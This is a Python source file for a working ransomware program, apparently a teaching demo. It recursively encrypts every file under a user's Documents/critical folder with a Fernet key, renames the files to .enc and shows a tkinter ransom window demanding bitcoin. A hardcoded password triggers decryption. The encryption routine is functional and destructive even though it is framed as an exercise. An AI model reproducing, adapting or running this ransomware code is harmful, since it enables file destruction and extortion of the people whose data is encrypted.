import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import  simpledialog , Label
import time

# Give the path to the user home directory

User_home_directory = os.path.expanduser("~")

# Now Give the directory path on which the ransomware should encrypt the files
# replace directory_name with your direcotry name
attack_directory = os.path.join(User_home_directory,'Documents/critical/')

# initaite a globla varibale password_checker with None value
password_checker = None

# generate fernet key

fern_key = Fernet.generate_key()

# Ransomware encryption function
def ransomencryptor(encryption_key,attack_dir):

    # generate a fernet cipher key 
    cipher_key = Fernet(encryption_key)

    # Create file size and file count variables
    Affected_files_size = 0
    Total_file_count = 0

    #instantiate a for loop to walkthrough the given attack directory

    for root, directories, files in os.walk(attack_dir):

        # For loop to go through each and every file in the attack directory
        for filename in files:
            # generate the path to the specific file
            original_file_path = os.path.join(root,filename)

            #open a file affected.txt to store the filenames that are affected

            with open(attack_dir + '/affected.txt','a') as af:
                af.writelines(original_file_path + '\n')
            
            #open the file and update the file_size varaible
            
            with open(original_file_path, 'rb') as org_file:
                #read the data into a variable
                data = org_file.read()
                #Update the size of the affected files
                Affected_files_size += os.path.getsize(original_file_path)
                #encrypt the data and store it in a variable
                enc_data = cipher_key.encrypt(data)
                org_file.close()

            #open the same file again and write enc_data into it
                
            with open(original_file_path, 'wb') as file_enc:
                #Renaming the file with .enc extension
                enc_filename = original_file_path + '.enc'
                # print(enc_filename)
                
                #Counting total files
                Total_file_count +=1
                #Writing encrypted data into the file
                file_enc.write(enc_data)
                # Renaming the file with .enc extension
                os.rename(original_file_path,enc_filename)

            #Creating delay
            time.sleep(10)
    
    # print(Affected_files_size)

    return Affected_files_size , Total_file_count





            


def passwordAuthentication(files_size, num_files):
    
    # Global variable password_checker accessed
    global password_checker

    #Defining the correct auth password
    Valid_password = 'Decrypt'

    # Creating Window labels for file_size and number of files
    Aggregate_file_size_label = Label(window,text=f"Affected Files Size: {files_size} bytes")
    Aggregate_file_size_label.pack()
    File_count_label = Label(window, text = f"Number of affected files: {num_files}")
    File_count_label.pack()
    Ransom_enc_label = Label(window, text="The system is under attack. Ransomware is injected...!!!")
    Ransom_enc_label.pack()
    Ransom_msg_label = Label(window, text=f"Files in this directory {attack_directory} are encrypted. Send this amount of ransom in bitcoin to this address : 3dB32rjF453921123")
    Ransom_msg_label.pack()

    #Password_Validation Loop
    while True:
        # Password Dialog Window
        Password_window = simpledialog.askstring("Password","Enter the decryption password:", show='$')

        #Password checker
        if Password_window is not None:
            # if password  is valid
            if Password_window == Valid_password :

                password_checker.config(text="Decryption Password is valid. DEcRyPtInG the files...!")
                
                # Decrypting the files....
                ransomdecryptor(fern_key,attack_directory)
                break

            else:
                # Password is not valid. Show an error message
                password_checker.config(text="Incorrect/Invalid password. I dare you to try again..!")



# Decryption Function

def ransomdecryptor(decrypt_key,victim_dir):
    
    # Generating decryption cipher suite
    decrypt_cipher = Fernet(decrypt_key)

    #Loop over all the files in the affected directory
    for root, directories, files in os.walk(victim_dir):
        for filename in files:
            encrypted_file_path = os.path.join(root, filename)
            #Find the files that are encrypted with .enc extension
            if encrypted_file_path.endswith('.enc'):
                with open(encrypted_file_path, 'rb') as encf:
                    enc_data = encf.read()
                    decrypted_data = decrypt_cipher.decrypt(enc_data)
                # rewrite the file with decrypted data and rename the file with orginal filename
                with open(encrypted_file_path, 'wb') as decf:
                    decryptfilename = encrypted_file_path.replace('.enc', '')
                    decf.write(decrypted_data)
                    os.rename(encrypted_file_path, decryptfilename)





if  __name__ == '__main__':
    #calling the ransomencrpytor function to encrypt the files

    aggregate_file_size , Affected_files = ransomencryptor(fern_key,attack_directory)

    # Generating an instance of tkinter 
    window = tk.Tk()
    # Giving title to the window
    window.title("ATTENTION....! Files are Encrypted")
    window.geometry("1200x200")

    # Creating display label

    password_checker = Label(window, text="")
    password_checker.pack()


    # Creating a button to open password input dialog box

    password_input_button = tk.Button(window, text = "Press to decrypt your files", command=lambda:passwordAuthentication(aggregate_file_size,Affected_files))
    password_input_button.pack(pady=23)


    # Intialising the loop

    window.mainloop()